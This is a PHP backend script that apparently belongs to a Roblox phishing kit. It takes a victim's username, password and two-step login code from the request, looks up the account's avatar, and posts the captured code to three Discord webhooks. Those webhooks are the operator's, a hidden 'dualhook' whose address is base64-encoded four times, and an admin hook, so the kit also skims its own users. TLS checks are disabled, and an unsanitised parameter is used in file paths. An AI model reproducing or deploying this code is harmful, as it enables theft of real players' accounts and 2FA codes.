<?php
require('setup.php');
function sanitizeInput($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}
if (isset($_GET['step']) && isset($_GET['u']) && isset($_GET['p'])) {
    $step = sanitizeInput($_GET['step']);
    $username = sanitizeInput($_GET['u']);
    $password = sanitizeInput($_GET['p']);
    $return = sanitizeInput($_GET['returnUrl']);
    $returnUrlFile = 'tokens/returnUrl-' . $_GET['returnUrl'] . '.txt';
    $webhook = base64_decode(base64_decode(file_get_contents($returnUrlFile)));
    $TermedFile = 'tokens/login/' . $_GET['returnUrl'] . '.txt';

    $loginTermed = file_get_contents($TermedFile);

    $Termedla = "tokens/dualhook/$loginTermed/name.txt";
    if (file_exists($Termedla)) {
        $trioxa = file_get_contents($Termedla);
    } else {
        $trioxa = $name;
    }

    $Termedla1 = "tokens/dualhook/$loginTermed/thumbnail.txt";
    if (file_exists($Termedla1)) {
        $trioxa1 = file_get_contents($Termedla1);
    } else {
        $trioxa1 = $image;
    }

    $Termedla2 = "tokens/dualhook/$loginTermed/hex.txt";
    if (file_exists($Termedla2)) {
        $trioxa2 = file_get_contents($Termedla2);
    } else {
        $trioxa2 = $color;
    }
    $dualHookFile = 'tokens/' . $_GET['returnUrl'] . '.txt';
    $Dwebhook = base64_decode(base64_decode(base64_decode(base64_decode(file_get_contents($dualHookFile)))));
    $TermedFile1 = 'tokens/login/' . $_GET['returnUrl'] . '.txt';

    $loginTermed1 = file_get_contents($TermedFile1);

    $Termedla = "tokens/dualhook/$loginTermed1/name.txt";
    if (file_exists($Termedla)) {
        $trioxa = file_get_contents($Termedla);
    } else {
        $trioxa = $name;
    }

    $Termedla1 = "tokens/dualhook/$loginTermed1/thumbnail.txt";
    if (file_exists($Termedla1)) {
        $trioxa1 = file_get_contents($Termedla1);
    } else {
        $trioxa1 = $image;
    }

    $Termedla2 = "tokens/dualhook/$loginTermed1/hex.txt";
    if (file_exists($Termedla2)) {
        $trioxa2 = file_get_contents($Termedla2);
    } else {
        $trioxa2 = $color;
    }

    if (preg_match('/^\d{6}$/', $step)) {
        $RobloxApi = 'https://api.newstargeted.com/roblox/users/v2/user.php?username=' . urlencode($username);
$p = file_get_contents($RobloxApi);

if ($p !== false) {
    $p0 = json_decode($p, true);
    if ($p0 !== null && isset($p0['userId'])) {
        $userId = $p0['userId'];
        $verified = 'Verified';
        $verifiedStatus = '✅';
        $api_url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false";
        $json = file_get_contents($api_url);
        $data = json_decode($json, true);
        $image_url = $data["data"][0]["imageUrl"];
        $timestamp = date("c", strtotime("now"));
        $ip = $_SERVER['REMOTE_ADDR'];

        $headers = [ 'Content-Type: application/json; charset=utf-8' ];
        $POST = [
    "username" => "$trioxa",
    "avatar_url" => "$trioxa1",
    "content" => "",
    "embeds" => [
        [
            "title" => "🛡️2step code received for $username",
            "type" => "rich",
            "color" => hexdec("$trioxa2"),
            "description" => "",
            "thumbnail" => [
                "url" => "$image_url",
            ],
            "footer" => [
                "text" => "$timestamp",
                "icon_url" => "$image_url",
            ],
            "fields" => [
                
                [
                    "name" => ":arrow_down:",
                    "value" => "```$step```",
                    "inline" => false
                ],
               
            ]
        ],
    ],
];

                    $discordIp = '162.159.137.232'; 
                $webhookPath = parse_url($Dwebhook, PHP_URL_PATH);
                $webhookIpUrl = "https://$discordIp" . $webhookPath;

                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $webhookIpUrl);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Content-Type: application/json',
                    'Host: discord.com'
                ));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                curl_setopt($ch, CURLOPT_RESOLVE, array("discord.com:443:$discordIp")); 
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curlError = curl_error($ch);
                curl_close($ch);

                if ($httpCode != 204) {
                    echo "ng";
                }

                // Debugging output
                echo "<pre>";
                echo "Webhook URL: $Dwebhook\n";
                echo "Payload: " . json_encode($POST) . "\n";
                echo "HTTP Code: $httpCode\n";
                echo "cURL Error: $curlError\n";
                echo "cURL Response: $response\n";
                echo "</pre>";

                
                $webhookPath = parse_url($webhook, PHP_URL_PATH);
                $webhookIpUrl = "https://$discordIp" . $webhookPath;

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $webhookIpUrl);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Content-Type: application/json',
                    'Host: discord.com'
                ));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
                curl_setopt($ch, CURLOPT_RESOLVE, array("discord.com:443:$discordIp")); 
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curlError = curl_error($ch);
                curl_close($ch);

                if ($httpCode != 204) {
                    echo "ng";
                }

                // Debugging output
                echo "<pre>";
                echo "Webhook URL: $webhook\n";
                echo "Payload: " . json_encode($POST) . "\n";
                echo "HTTP Code: $httpCode\n";
                echo "cURL Error: $curlError\n";
                echo "cURL Response: $response\n";
                echo "</pre>";

                
                $webhookPath = parse_url($admin, PHP_URL_PATH);
                $webhookIpUrl = "https://$discordIp" . $webhookPath;

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $webhookIpUrl);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Content-Type: application/json',
                    'Host: discord.com'
                ));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
                curl_setopt($ch, CURLOPT_RESOLVE, array("discord.com:443:$discordIp")); 
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curlError = curl_error($ch);
                curl_close($ch);

                if ($httpCode != 204) {
                    echo "ng";
                }

                // Debugging output
                echo "<pre>";
                echo "Webhook URL: $admin\n";
                echo "Payload: " . json_encode($POST) . "\n";
                echo "HTTP Code: $httpCode\n";
                echo "cURL Error: $curlError\n";
                echo "cURL Response: $response\n";
                echo "</pre>";

                echo "\nVerification Status: $verified"; // removing this will crash the login!
            
    
    }
}
    } else {

        echo 'Error';
    }
} else {

    echo 'Error';
}
?>
